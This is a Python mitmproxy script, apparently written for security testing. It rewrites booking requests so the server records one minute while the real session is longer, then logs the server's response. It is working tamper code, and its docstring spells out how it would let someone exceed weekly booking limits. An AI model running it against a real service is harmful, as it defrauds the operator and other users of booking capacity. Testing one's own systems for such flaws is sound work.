"""
Tests whether currentHours/weeklyLimit accounting is derived from the
real, server-known duration of the slot, or from whatever
start_time/end_time gap the client happens to submit.

Run this against a service that is still UNDER its weekly limit
(per your note, anything but Gym right now) so you can actually watch
a booking get accepted and then see how much "currentHours" moved.

What it does on every matching POST /bookings/services for the
target service:
  - keeps start_time as submitted
  - shrinks end_time down to start_time + SHRINK_TO_MINUTES, instead
    of the real session length the app intended
  - logs before/after so you can compare the real slot length you
    picked in the app vs what was actually sent

After it fires, call GET /bookings/services/weekly-limit for that
service and compare currentHours to what a full-length session
should have cost. If currentHours only went up by the shrunk amount
(not the real slot length), the server is trusting client-submitted
duration for its hour accounting — a real finding, since you could
then book many real-length slots while reporting near-zero duration
each time.

Run with:
    mitmdump -s duration_mismatch_tamper_test.py
"""

import json
from datetime import datetime, timedelta, timezone
from mitmproxy import http, ctx

PATH = "/bookings/services"
TARGET_SERVICE_ID = (
	None  # set to the under-limit service's id; None = any service
)
SHRINK_TO_MINUTES = 1  # report a 1-minute booking regardless of real length


def matches(flow: http.HTTPFlow) -> bool:
	req = flow.request
	if req.method != "POST":
		return False
	if not req.path.split("?")[0].endswith(PATH):
		return False
	try:
		body = json.loads(req.get_text() or "{}")
	except ValueError:
		return False
	if TARGET_SERVICE_ID and body.get("service_id") != TARGET_SERVICE_ID:
		return False
	return "start_time" in body and "end_time" in body


def request(flow: http.HTTPFlow) -> None:
	if not matches(flow):
		return
	try:
		body = json.loads(flow.request.get_text())
	except ValueError:
		return
	start = datetime.fromisoformat(
		body["start_time"].replace("Z", "+00:00")
	)
	real_end = datetime.fromisoformat(
		body["end_time"].replace("Z", "+00:00")
	)
	fake_end = start + timedelta(minutes=SHRINK_TO_MINUTES)
	body["end_time"] = (
		fake_end.astimezone(timezone.utc)
		.isoformat()
		.replace("+00:00", "Z")
	)
	flow.request.set_text(json.dumps(body))
	flow.comment = "tampered: shrunk reported duration"
	ctx.log.info(
		f"[duration] service={body.get('service_id')} real_end={real_end.isoformat()} "
		f"-> reported_end={body['end_time']} (claimed {SHRINK_TO_MINUTES}min instead of "
		f"{(real_end - start)})"
	)


def response(flow: http.HTTPFlow) -> None:
	if not matches(flow) or flow.response is None:
		return
	ctx.log.info(
		f"[duration] response status={flow.response.status_code} "
		f"body={flow.response.get_text()}"
	)
